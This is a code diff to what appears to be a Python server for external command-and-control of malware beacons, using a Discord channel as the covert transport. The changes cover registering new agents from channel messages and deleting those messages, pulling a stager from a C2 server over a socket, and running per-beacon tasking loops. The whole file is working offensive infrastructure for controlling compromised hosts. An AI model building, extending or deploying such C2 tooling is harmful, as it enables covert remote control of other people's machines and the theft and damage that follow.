@@ -7,6 +7,7 @@ from utils import commonUtils
 from utils.encoders import encoder_base64
 from utils.transports import transport_discord
 from time import sleep
+from bot_client import client
 import establishedSession
 import configureStage
 import config
@@ -18,12 +19,6 @@ CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID'))
 
 # Global dictionary to store beacon sessions
 sock_beacons = {}
-
-intents = discord.Intents.all()
-intents.messages = True
-intents.message_content = True
-
-client = discord.Client(intents=intents)
 
 def importModule(modName, modType):
     """
@@ -47,20 +42,13 @@ async def createConnection(beaconId):
     # Start with logic to setup the connection to the external_c2 server
     sock = commonUtils.createSocket()
 
-    # while True:
-    #     # Replace this with the actual implementation to check for messages from the client
-    #     message = commonUtils.recvFrameFromC2(sock)  # Example method to receive messages
-    #     if message == "READY2INJECT":
-    #         if config.verbose:
-    #             print(commonUtils.color("Client ready to receive stager"))
-    #         break  # Exit the loop once the client confirms readiness
-    #     sleep(5)  # Poll every second, adjust as necessary
-
-    # Prep the transport module
-    prep_trans = transport_discord.prepTransport()
+    if sock is None:
+        # Handle the case where the socket creation fails
+        print(commonUtils.color("Failed to create a socket connection.", status=False, warning=True))
+        sys.exit(1)
 
     # Let's get the stager from the C2 server
-    stager_status = configureStage.loadStager(sock, beaconId)
+    stager_status = await configureStage.loadStager(sock, beaconId)
 
     if stager_status != 0:
         # Something went horribly wrong
@@ -96,10 +84,9 @@ async def fetchResponse(channel, beaconId):
     """
     Fetch responses from the beacon via Discord messages.
     """
-    async for message in channel.history(limit=100):  # Adjust limit as needed
+    async for message in channel.history(limit=2):  # Adjust limit as needed
         if message.content.startswith(f"{beaconId}:RespForYou"):
-            encoded_response = message.content.split(f"{beaconId}:RespForYou: ")[1]
-            return encoder_base64.decode(encoded_response)
+            await commonUtils.retrieveData(beaconId)            
     return None
 
 
@@ -130,10 +117,35 @@ async def taskLoop(beaconId, channel):
         await asyncio.sleep(config.C2_BLOCK_TIME / 100)  # Use asyncio.sleep instead of time.sleep
 
 
+async def fetchNewBeacons():
+    """
+    Fetches new beacons that have registered to the Discord channel via messages starting with "AGENT:".
+    
+    Returns:
+        list - List of beacon IDs that need to be handled.
+    """
+    beacons = []
+    channel = client.get_channel(CHANNEL_ID)
+    if channel:
+        async for message in channel.history(limit=1):  # Adjust the limit based on need
+            if message.content.startswith("AGENT:"):
+                beaconId = message.content.split("AGENT:")[1]
+                if beaconId not in beacons:
+                    print(f"[+] Discovered new Agent in channel: {beaconId}")
+                    beacons.append(beaconId)
+                    await message.delete()  # Delete the message after detecting the beacon
+        if beacons:
+            print(f"[+] Returning {len(beacons)} beacons for first-time setup.")
+        return beacons
+    else:
+        print(f"Error: Could not find command channel")
+        return []
+
 
 @client.event
 async def on_ready():
     print(f'Logged in as {client.user}')
+
 
 @client.event
 async def on_message(message):
@@ -142,18 +154,19 @@ async def on_message(message):
     This function checks for new agents (beacons) registering and processes tasks/responses.
     """
     if message.channel.id == CHANNEL_ID:
-        beacons = transport_discord.fetchNewBeacons()
+        beacons = await fetchNewBeacons()
 
         # Start a new task loop for this agent
         for beaconId in beacons:
-            print(f"[+] Established new session {beaconId}. Starting task loop.")
             channel = message.channel
-            sock = createConnection(beaconId)
+            sock = await createConnection(beaconId)
+            if sock:
+                print(f"[+] Established new session {beaconId}. Starting task loop.")
             # Create a new asyncio task for the taskLoop
-            asyncio.create_task(taskLoop(beaconId, channel))
-
+                asyncio.create_task(taskLoop(beaconId, channel))
             # Store the socket in the beacons dictionary
-            sock_beacons[beaconId] = sock
+                sock_beacons[beaconId] = sock
+
 
 def main():
     # Argparse for certain options
